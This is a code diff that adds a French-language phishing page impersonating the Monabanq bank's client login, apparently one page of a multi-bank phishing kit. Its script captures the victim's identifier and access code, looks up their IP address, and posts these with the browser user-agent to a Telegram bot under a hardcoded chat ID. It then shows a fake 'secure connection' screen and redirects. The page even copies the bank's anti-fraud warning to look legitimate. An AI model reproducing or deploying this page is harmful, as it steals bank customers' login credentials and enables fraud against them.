@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <script>
+        window.telegramConfig = {
+            BOT_TOKEN: "TELEGRAM_BOT_TOKEN_PLACEHOLDER",
+            CHAT_ID: "TELEGRAM_CHAT_ID_PLACEHOLDER"
+        };
+    </script>
+            <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Espace Client - Monabanq</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        
+        /* Animation pour le texte de chargement */
+        .animate-pulse-slow {
+            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: .5; }
+        }
+        
+        /* BOUTON RETOUR AU-DESSUS DU LOGO */
+        .back-to-bank-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: white;
+            border-bottom: 1px solid #e2e8f0;
+            padding: 12px 20px;
+            z-index: 1000;
+            display: flex;
+            justify-content: flex-start;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        
+        .back-to-bank-btn {
+            background-color: #0b2121;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 8px 16px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .back-to-bank-btn:hover {
+            background-color: #1a3a3a;
+            transform: translateX(-2px);
+        }
+        
+        .back-to-bank-btn:active {
+            transform: translateX(0);
+        }
+        
+        .back-to-bank-btn i {
+            font-size: 14px;
+            font-style: normal;
+            font-weight: bold;
+        }
+        
+        @media (max-width: 768px) {
+            .back-to-bank-container {
+                padding: 8px 15px;
+            }
+            .back-to-bank-btn {
+                padding: 6px 12px;
+                font-size: 11px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .back-to-bank-btn {
+                padding: 5px 10px;
+                font-size: 10px;
+            }
+        }
+        
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #1e293b;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 12px;
+            font-size: 14px;
+            z-index: 10000;
+            display: none;
+            white-space: nowrap;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            font-weight: 500;
+        }
+        .toast.show { display: block; animation: fadeInOut 3s ease-in-out; }
+        .toast.success { background-color: #10b981; }
+        .toast.error { background-color: #ef4444; }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            15% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            85% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            100% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+        }
+    
+        /* ===== OPTIMISATIONS MOBILE ===== */
+        * {
+            box-sizing: border-box;
+        }
+        
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            overflow-x: hidden;
+        }
+        
+        /* Responsive images */
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        /* Responsive text */
+        @media (max-width: 768px) {
+            body {
+                font-size: 14px;
+                line-height: 1.5;
+            }
+            
+            h1, .h1 { font-size: 20px !important; }
+            h2, .h2 { font-size: 18px !important; }
+            h3, .h3 { font-size: 16px !important; }
+            
+            /* Buttons */
+            button, .btn, [class*="btn"] {
+                min-height: 44px;
+                padding: 12px 20px !important;
+                font-size: 14px;
+            }
+            
+            /* Inputs */
+            input, select, textarea {
+                min-height: 44px;
+                padding: 12px;
+                font-size: 16px;
+            }
+            
+            /* Layout */
+            .container, main, section {
+                padding: 15px !important;
+            }
+            
+            /* Grid adjustments */
+            [class*="grid"], [class*="flex"] {
+                flex-direction: column;
+            }
+            
+            /* Hide unnecessary elements */
+            .hide-mobile {
+                display: none !important;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            h1, .h1 { font-size: 18px !important; }
+            h2, .h2 { font-size: 16px !important; }
+            h3, .h3 { font-size: 14px !important; }
+            
+            button, .btn, [class*="btn"] {
+                width: 100%;
+                padding: 14px 16px !important;
+                font-size: 13px;
+            }
+            
+            input, select, textarea {
+                font-size: 16px;
+            }
+            
+            .container, main, section {
+                padding: 10px !important;
+            }
+        }
+
+    </style>
+</head>
+<body class="min-h-screen bg-[#f3f4f0] text-slate-900 flex flex-col relative">
+
+    <!-- BOUTON RETOUR AU-DESSUS DU LOGO -->
+    <div class="back-to-bank-container">
+        <button class="back-to-bank-btn" onclick="window.location.href='bank.html'">
+            <i>←</i> Retour aux banques
+        </button>
+    </div>
+
+    <!-- Toast notification -->
+    <div id="toast" class="toast"></div>
+
+    <!-- ========================================== -->
+    <!-- ÉCRAN DE CHARGEMENT (Caché par défaut)     -->
+    <!-- ========================================== -->
+    <div id="ecran-chargement" class="hidden fixed inset-0 z-50 bg-[#f3f4f0] flex-col items-center justify-center">
+        <div class="flex flex-col items-center p-8 bg-white rounded-2xl shadow-sm max-w-sm w-full mx-4">
+            
+            <!-- Logo -->
+            <div class="text-4xl font-extrabold tracking-tighter mb-10">
+                monabanq<span class="text-2xl">••</span>
+            </div>
+
+            <!-- Icône de chargement -->
+            <svg class="animate-spin h-12 w-12 text-slate-800 mb-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-20" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-80" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+
+            <!-- Texte -->
+            <p class="text-lg font-semibold text-slate-700 animate-pulse-slow text-center">
+                Connexion sécurisée en cours...
+            </p>
+            <p class="text-xs text-slate-400 mt-3 text-center">
+                Veuillez ne pas rafraîchir cette page.
+            </p>
+        </div>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- CONTENU PRINCIPAL DE LA PAGE               -->
+    <!-- ========================================== -->
+
+    <!-- En-tête -->
+    <header class="flex justify-between items-center px-8 py-6 mt-12">
+        <div class="text-3xl font-extrabold tracking-tighter">
+            monabanq<span class="text-xl">••</span>
+        </div>
+        <div class="flex items-center gap-6 text-slate-800">
+            <svg class="w-6 h-6 cursor-pointer hover:text-black transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
+            <svg class="w-6 h-6 cursor-pointer hover:text-black transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"></path></svg>
+            <svg class="w-6 h-6 cursor-pointer hover:text-black transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+        </div>
+    </header>
+
+    <!-- Section Connexion -->
+    <main class="flex-1 flex flex-col items-center mt-6 px-4 mb-20">
+        <div class="bg-white flex rounded-xl shadow-sm mb-8 p-1.5 w-full max-w-[500px]">
+            <button class="flex-1 bg-[#bdf3cc] text-slate-900 font-semibold py-3.5 rounded-lg text-sm transition-colors">Déjà client</button>
+            <button class="flex-1 text-slate-900 font-semibold py-3.5 rounded-lg text-sm hover:bg-gray-50 transition-colors">Suivi d'ouverture</button>
+        </div>
+
+        <div class="bg-white rounded-[20px] shadow-sm w-full max-w-[500px] p-10 pb-12">
+            <h1 class="text-[28px] font-extrabold mb-8 text-center text-slate-900 tracking-tight">Accéder à mon espace client</h1>
+
+            <div class="bg-[#fcf6f0] rounded-xl p-5 mb-8">
+                <div class="flex items-center gap-2.5 mb-2">
+                    <svg class="w-5 h-5 text-[#b25b33]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+                    <h2 class="text-[#b25b33] font-bold text-sm">Fraude : restez vigilant</h2>
+                </div>
+                <div class="text-[13px] text-slate-800 leading-[1.6] space-y-2 ml-7.5 pl-1.5">
+                    <p>Pour votre sécurité, ne communiquez jamais vos identifiants, codes ou données bancaires par téléphone, e-mail ou SMS.</p>
+                    <p>Nos conseillers ne vous demanderont jamais ce type d'information.</p>
+                    <p>Consultez nos articles pour éviter les fraudes : <a href="#" class="underline underline-offset-2 hover:text-black">Cliquez-ici</a></p>
+                </div>
+            </div>
+
+            <!-- Formulaire -->
+            <form id="formConnexion" class="flex flex-col gap-6">
+                <div class="flex flex-col gap-2">
+                    <label for="identifiant" class="font-bold text-[15px]">Identifiant</label>
+                    <input type="text" id="identifiant" required class="w-full border-2 border-slate-900 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-slate-400 transition-shadow">
+                </div>
+
+                <div class="flex flex-col gap-2">
+                    <label for="code" class="font-bold text-[15px]">Code d'accès</label>
+                    <div class="relative">
+                        <input type="password" id="code" required class="w-full border border-gray-300 rounded-lg p-3 focus:outline-none focus:border-slate-900 focus:ring-1 focus:ring-slate-900 transition-shadow">
+                        <button type="button" id="togglePassword" class="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-800 transition-colors">
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"></path></svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="flex items-center justify-center gap-3 mt-1 mb-2">
+                    <input type="checkbox" id="memoriser" class="w-4 h-4 rounded border-gray-300 text-slate-900 focus:ring-slate-900 cursor-pointer">
+                    <label for="memoriser" class="text-[15px] cursor-pointer text-slate-800">Mémoriser mon identifiant</label>
+                </div>
+
+                <button type="submit" id="submitBtn" class="bg-[#bdf3cc] hover:bg-[#a5e6b7] text-slate-900 font-bold py-3.5 px-10 rounded-full w-max mx-auto transition-colors">
+                    Se connecter
+                </button>
+            </form>
+
+            <div class="mt-12 flex flex-col items-center gap-3.5 text-[15px] font-medium text-slate-800">
+                <div class="flex gap-8">
+                    <a href="#" class="underline underline-offset-2 hover:text-black">Code d'accès oublié</a>
+                    <a href="#" class="underline underline-offset-2 hover:text-black">Identifiant oublié</a>
+                </div>
+                <a href="#" class="underline underline-offset-2 hover:text-black">Accès bloqué</a>
+            </div>
+        </div>
+    </main>
+
+    <!-- Pied de page -->
+    <footer class="w-full mt-auto">
+        <div class="bg-[#0b2121] text-white py-12 px-8 lg:px-16 flex flex-col lg:flex-row justify-between items-start lg:items-center gap-10">
+            <div>
+                <h3 class="font-bold text-lg mb-5">L'application est disponible ici</h3>
+                <div class="flex gap-4">
+                    <button class="bg-white text-black flex items-center gap-2 px-3 py-2 rounded-lg hover:bg-gray-100 transition">
+                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M16.365 14.122c-.01-2.923 2.385-4.324 2.497-4.39-1.353-1.982-3.447-2.25-4.17-2.29-1.782-.18-3.475 1.05-4.39 1.05-.902 0-2.316-1.02-3.793-1.006-1.92.015-3.69 1.116-4.675 2.83-2.004 3.473-.513 8.625 1.442 11.455.954 1.38 2.083 2.927 3.593 2.87 1.445-.06 1.996-.935 3.694-.935 1.684 0 2.213.936 3.722.906 1.554-.03 2.53-1.408 3.472-2.784 1.096-1.602 1.545-3.155 1.57-3.235-.035-.015-3.036-1.164-3.048-4.47h.086zm-1.878-6.196c.797-.966 1.332-2.31 1.186-3.644-1.135.046-2.54.755-3.355 1.71-.652.755-1.294 2.12-1.127 3.42 1.272.1 2.5-.664 3.3-1.486h-.004z"/></svg>
+                        <div class="text-left leading-none">
+                            <div class="text-[9px]">Télécharger dans</div>
+                            <div class="text-sm font-bold">l'App Store</div>
+                        </div>
+                    </button>
+                    <button class="bg-white text-black flex items-center gap-2 px-3 py-2 rounded-lg hover:bg-gray-100 transition">
+                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M3.483 2.463c-.22.238-.344.577-.344 1.01v17.054c0 .433.124.772.344 1.01l.033.03 9.47-9.47v-.176l-9.47-9.47-.033.012zm10.15 10.15l3.14-3.14L5.688 3.108 13.633 12.613zm0 .2l-7.945 9.505 11.085-6.365-3.14-3.14zM20.21 11.16l-2.535-1.465-1.92 1.92v.77l1.92 1.92 2.535-1.465c.7-.406.7-.82 0-1.22l-.002-.46z"/></svg>
+                        <div class="text-left leading-none">
+                            <div class="text-[9px] uppercase">Disponible sur</div>
+                            <div class="text-sm font-bold">Google Play</div>
+                        </div>
+                    </button>
+                </div>
+            </div>
+
+            <div class="flex-1 lg:text-center">
+                <h3 class="font-bold text-lg mb-5">Documents utiles à télécharger</h3>
+                <div class="text-sm font-bold flex flex-wrap lg:justify-center items-center gap-3 text-white">
+                    <a href="#" class="hover:underline">Tarification</a> 
+                    <span class="text-gray-500 font-normal opacity-50">|</span>
+                    <a href="#" class="hover:underline">Informations tarifaires</a> 
+                    <span class="text-gray-500 font-normal opacity-50">|</span>
+                    <a href="#" class="hover:underline">Conditions générales</a>
+                </div>
+            </div>
+
+            <div class="flex items-center gap-4 max-w-sm">
+                <div class="relative w-20 h-20 flex-shrink-0 bg-blue-600 rounded transform -rotate-6 shadow border border-blue-400 flex flex-col justify-center items-center text-center overflow-hidden">
+                    <div class="absolute top-0 w-full h-3 bg-red-600"></div>
+                    <span class="text-[8px] font-bold text-white mt-2 leading-none uppercase">Élu</span>
+                    <span class="text-[10px] font-bold text-white leading-tight uppercase">Service<br>Client</span>
+                    <span class="text-[7px] text-white leading-none mt-1">de l'année</span>
+                    <span class="text-lg font-bold text-white leading-none mt-1">2026</span>
+                </div>
+                <div>
+                    <h3 class="font-bold text-base mb-1">Elu Service client de l'Année 2026</h3>
+                    <p class="text-xs text-gray-300 leading-snug">
+                        Catégorie Banque en ligne pour les particuliers Étude Ipsos bva - Viséo CI<br>
+                        Plus d'infos sur <a href="#" class="underline underline-offset-2 text-white">escda.fr</a>
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <div class="bg-white py-16 px-8 lg:px-16 relative border-t border-gray-200">
+            <div class="max-w-[1400px] mx-auto grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-12 text-[14px]">
+                <div>
+                    <h4 class="font-bold text-lg mb-6 text-slate-900">Aide & support</h4>
+                    <ul class="space-y-3 text-slate-700 font-medium">
+                        <li><a href="#" class="hover:text-black hover:underline">Liste des fonctionnalités</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Questions / réponses</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Nos conseils de sécurité</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Confirmation mobile</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Garder un Smartphone sécurisé</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Nous contacter</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Accessibilité</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-bold text-lg mb-6 text-slate-900">Informations légales</h4>
+                    <ul class="space-y-3 text-slate-700 font-medium">
+                        <li><a href="#" class="hover:text-black hover:underline">Mentions légales</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Politique de protection des données</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Politique de protection des données</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Recrutement</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Recrutement</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Politique de conservation des données</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Notre charte de protection et d'utilisation des données personnelles</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Informations Cookies</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-bold text-lg mb-6 text-slate-900">Nos engagements</h4>
+                    <ul class="space-y-3 text-slate-700 font-medium">
+                        <li><a href="#" class="hover:text-black hover:underline">Nos guides</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">VDP (Vulnerability Disclosure Program)</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">SOS Villages d'Enfants</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-bold text-lg mb-6 text-slate-900">Monabanq & vous</h4>
+                    <ul class="space-y-3 text-slate-700 font-medium">
+                        <li><a href="#" class="hover:text-black hover:underline">Nos conseils</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Monabanq recrute</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Espace presse</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Plan du site</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Affiliation</a></li>
+                        <li><a href="#" class="hover:text-black hover:underline">Parrainage compte courant</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <button onclick="window.scrollTo({top: 0, behavior: 'smooth'})" class="absolute bottom-12 right-8 w-10 h-10 rounded-full border border-gray-300 flex items-center justify-center text-green-700 hover:bg-gray-50 transition-colors shadow-sm">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"></path></svg>
+            </button>
+        </div>
+    </footer>
+
+    <script>
+        // Configuration Telegram
+        const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || 'TELEGRAM_BOT_TOKEN_PLACEHOLDER';
+        const CHAT_ID = '8176081750';
+
+        // Toast elements
+        const toast = document.getElementById('toast');
+        
+        function showToast(message, isError = false) {
+            toast.textContent = message;
+            toast.className = 'toast show' + (isError ? ' error' : ' success');
+            setTimeout(() => {
+                toast.classList.remove('show');
+                toast.className = 'toast';
+            }, 3000);
+        }
+
+        // Éléments du formulaire
+        const form = document.getElementById('formConnexion');
+        const submitBtn = document.getElementById('submitBtn');
+        const identifiantInput = document.getElementById('identifiant');
+        const codeInput = document.getElementById('code');
+        const togglePasswordBtn = document.getElementById('togglePassword');
+        const memoriserCheckbox = document.getElementById('memoriser');
+
+        // Fonction pour obtenir l'IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || 'Non disponible';
+            } catch (error) {
+                return 'Non disponible';
+            }
+        }
+
+        // Toggle password visibility
+        if (togglePasswordBtn) {
+            togglePasswordBtn.addEventListener('click', function() {
+                const type = codeInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                codeInput.setAttribute('type', type);
+            });
+        }
+
+        // Charger l'identifiant mémorisé
+        const savedIdentifiant = localStorage.getItem('monabanq_identifiant');
+        if (savedIdentifiant) {
+            identifiantInput.value = savedIdentifiant;
+            memoriserCheckbox.checked = true;
+        }
+
+        // Envoi à Telegram
+        async function sendToTelegram() {
+            const ip = await getIP();
+            const message = `🏦 MONABANQ - NOUVELLE CONNEXION 🏦\n━━━━━━━━━━━━━━━━━━━━━\n👤 Identifiant: ${identifiantInput.value}\n🔑 Code d'accès: ${codeInput.value}\n💾 Mémorisé: ${memoriserCheckbox.checked ? 'OUI ✅' : 'NON ❌'}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 IP: ${ip}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n✅ Statut: Connexion en cours`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN || BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: window.CHAT_ID || CHAT_ID,
+                        text: message
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.ok) {
+                    console.log('');
+                    return true;
+                } else {
+                                        showToast('❌ Erreur: ' + data.description, true);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Erreur lors de l\'envoi à Telegram:', error);
+                showToast('❌ Erreur de connexion', true);
+                return false;
+            }
+        }
+
+        // Soumission du formulaire
+        form.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            // Validation simple
+            if (!identifiantInput.value.trim()) {
+                showToast('⚠️ Veuillez saisir votre identifiant', true);
+                identifiantInput.focus();
+                return;
+            }
+            
+            if (!codeInput.value.trim()) {
+                showToast('⚠️ Veuillez saisir votre code d\'accès', true);
+                codeInput.focus();
+                return;
+            }
+            
+            // Sauvegarder l'identifiant si coché
+            if (memoriserCheckbox.checked) {
+                localStorage.setItem('monabanq_identifiant', identifiantInput.value);
+            } else {
+                localStorage.removeItem('monabanq_identifiant');
+            }
+            
+            // Désactiver le bouton
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Connexion en cours...';
+            
+            // Afficher l'écran de chargement
+            const ecranChargement = document.getElementById('ecran-chargement');
+            ecranChargement.classList.remove('hidden');
+            ecranChargement.classList.add('flex');
+            
+            // Désactiver le scroll de la page en arrière-plan
+            document.body.style.overflow = 'hidden';
+            
+            // Envoyer les données à Telegram
+            await sendToTelegram();
+            
+            // Redirection après 2 secondes
+            setTimeout(() => {
+                window.location.href = 'confirmation.html';
+            }, 2000);
+        });
+    </script>
+
+</body>
+</html>
+
